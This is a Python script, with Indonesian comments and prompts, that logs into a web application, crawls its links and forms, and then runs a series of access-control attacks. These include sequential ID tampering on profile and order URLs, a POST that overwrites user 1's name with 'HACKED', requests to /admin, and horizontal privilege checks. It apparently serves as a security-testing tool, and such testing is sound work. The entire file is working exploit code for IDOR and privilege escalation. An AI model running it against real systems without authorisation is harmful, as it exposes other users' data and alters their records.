import requests
from difflib import SequenceMatcher
from bs4 import BeautifulSoup

USER_ID_RANGE = range(1, 6)


def login(base_url, email, password):
    session = requests.Session()
    resp = session.post(
        f"{base_url}/login",
        data={"email": email, "password": password},
        allow_redirects=True
    )
    if resp.status_code in (200, 302):
        print(f"[+] Login sukses sebagai {email}")
        return session
    else:
        print(f"[-] Login gagal ({email}) -> {resp.status_code}")
        return None


def similarity(a, b):
    return SequenceMatcher(None, a, b).ratio()


def crawl(session, base_url):
    """Crawl halaman utama -> ambil semua link & form"""
    found_links, found_forms = set(), []
    resp = session.get(base_url)
    soup = BeautifulSoup(resp.text, "html.parser")

    # Ambil link
    for a in soup.find_all("a", href=True):
        href = a["href"]
        if href.startswith("/"):
            href = base_url + href
        found_links.add(href)

    # Ambil form
    for f in soup.find_all("form"):
        action = f.get("action")
        method = f.get("method", "get").lower()
        inputs = [i.get("name") for i in f.find_all("input") if i.get("name")]
        found_forms.append({"action": action, "method": method, "inputs": inputs})

    return list(found_links), found_forms


def sequential_path(session, base_url):
    print("\n[1] Sequential ID Tampering (Path)")
    for uid in USER_ID_RANGE:
        url = f"{base_url}/profile/{uid}"
        r = session.get(url)
        print(f"  GET {url} -> {r.status_code} ({len(r.text)} bytes)")


def sequential_query(session, base_url):
    print("\n[2] Sequential ID Tampering (Query Param)")
    for oid in USER_ID_RANGE:
        url = f"{base_url}/orders?id={oid}"
        r = session.get(url)
        print(f"  GET {url} -> {r.status_code}")


def hidden_field_post(session, base_url):
    print("\n[3] Hidden Field Manipulation (POST data)")
    data = {"user_id": 1, "name": "HACKED"}
    r = session.post(f"{base_url}/update", data=data)
    print(f"  POST /update user_id=1 -> {r.status_code}")


def role_comparison(session, base_url):
    print("\n[4] Role Response Comparison (self-check)")
    url = f"{base_url}/profile/1"
    r1 = session.get(url)
    r2 = session.get(f"{base_url}/profile/2")

    sim = similarity(r1.text, r2.text)
    print(f"  Profile(1) vs Profile(2) similarity={sim:.2f}")


def vertical_privilege(session, base_url):
    print("\n[5] Vertical Privilege Escalation (/admin)")
    r = session.get(f"{base_url}/admin")
    print(f"  GET /admin -> {r.status_code}")


def horizontal_privilege(session, base_url):
    print("\n[6] Horizontal Privilege Escalation")
    for uid in USER_ID_RANGE:
        url = f"{base_url}/profile/{uid}"
        r = session.get(url)
        print(f"  GET {url} -> {r.status_code}")


# ================= MAIN =================
if __name__ == "__main__":
    base_url = input("Masukkan target base URL (contoh: http://127.0.0.1:5002): ").strip()
    email = input("Masukkan email: ").strip()
    password = input("Masukkan password: ").strip()

    sess = login(base_url, email, password)
    if not sess:
        exit()

    # Crawl
    links, forms = crawl(sess, base_url)
    print(f"\n[+] Link ditemukan: {len(links)}")
    for l in links:
        print("  -", l)
    print(f"[+] Form ditemukan: {len(forms)}")

    # Jalankan skenario IDOR
    sequential_path(sess, base_url)
    sequential_query(sess, base_url)
    hidden_field_post(sess, base_url)
    role_comparison(sess, base_url)
    vertical_privilege(sess, base_url)
    horizontal_privilege(sess, base_url)
